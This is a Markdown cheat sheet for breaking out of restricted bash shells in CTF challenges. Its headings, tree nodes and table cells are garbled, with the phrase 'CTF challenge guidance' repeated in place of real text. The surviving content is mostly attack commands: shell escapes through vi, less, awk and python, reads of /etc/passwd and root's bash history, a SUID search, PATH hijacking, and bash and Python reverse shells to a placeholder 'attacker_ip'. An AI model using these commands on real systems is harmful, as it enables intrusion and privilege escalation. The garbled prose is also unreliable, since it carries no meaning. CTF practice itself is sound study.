# Bash Jail CTF challenge guidance

## CTF challenge guidance

```
CTF challenge guidance shell (rbash/rksh)
├── CTF challenge guidance cd 
│   ├── CTF challenge guidance → cd /; sh CTF challenge guidance shell
│   └── CTF challenge guidance → CTF challenge guidance/CTF challenge guidance
├── CTF challenge guidance/CTF challenge guidance 
│   ├── CTF challenge guidance → `whoami` CTF challenge guidance $(whoami)
│   └── CTF challenge guidance → CTF challenge guidance
├── CTF challenge guidance 
│   ├── /dev/tcp → CTF challenge guidance shell
│   ├── /proc → CTF challenge guidance
│   └── CTF challenge guidance HISTFILE → CTF challenge guidance
└── CTF challenge guidance 
    ├── vi/vim → :!/bin/sh CTF challenge guidance
    ├── awk → awk 'BEGIN {system("id")}'
    ├── find → find ... -exec
    └── python/perl → CTF challenge guidance
```

## CTF challenge guidance

### 1. CTF challenge guidance
```bash
vi/vim: :!/bin/sh  CTF challenge guidance  :!/bin/bash
vim:   :shell
less:  !/bin/sh
more:  !/bin/sh
man:   !/bin/sh
```

### 2. CTF challenge guidance
```bash
awk:    awk 'BEGIN {system("whoami")}'
perl:   perl -e 'system("whoami")'
python: python -c 'import os; os.system("whoami")'
ruby:   ruby -e 'system("whoami")'
lua:    lua -e 'os.execute("whoami")'
```

### 3. CTF challenge guidance
```bash
find:   find / -exec whoami \;
dd:     dd if=/dev/null of=/dev/null
cp:     cp /dev/null /tmp/a; cat /tmp/a
```

### 4. CTF challenge guidance
```bash
# CTF challenge guidance /etc/passwd
cat /etc/passwd
dd if=/etc/passwd
```

### 5. CTF challenge guidance
```bash
cat ~/.bash_history
cat /root/.bash_history
```

### 6. CTF challenge guidance Shell
```bash
bash -i >& /dev/tcp/attacker_ip/port 0>&1
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker_ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## rbash CTF challenge guidance

| CTF challenge guidance | CTF challenge guidance |
|------|---------|
| CTF challenge guidance cd | `cd /; /bin/bash` |
| CTF challenge guidance / | CTF challenge guidance |
| CTF challenge guidance $() | CTF challenge guidance `` `$var` `` |
| CTF challenge guidance | CTF challenge guidance |
| CTF challenge guidance | `/dev/null` CTF challenge guidance |

## CTF challenge guidance SUID CTF challenge guidance

```bash
# CTF challenge guidance SUID CTF challenge guidance
find / -perm -4000 2>/dev/null

# CTF challenge guidance SUID
/usr/bin/sudo
/usr/bin/python
/usr/bin/perl
/bin/more
/bin/less
/bin/awk
/bin/nice
```

## CTF challenge guidance Path CTF challenge guidance

```bash
# CTF challenge guidance PATH
export PATH=/tmp:$PATH
# CTF challenge guidance /tmp CTF challenge guidance
```
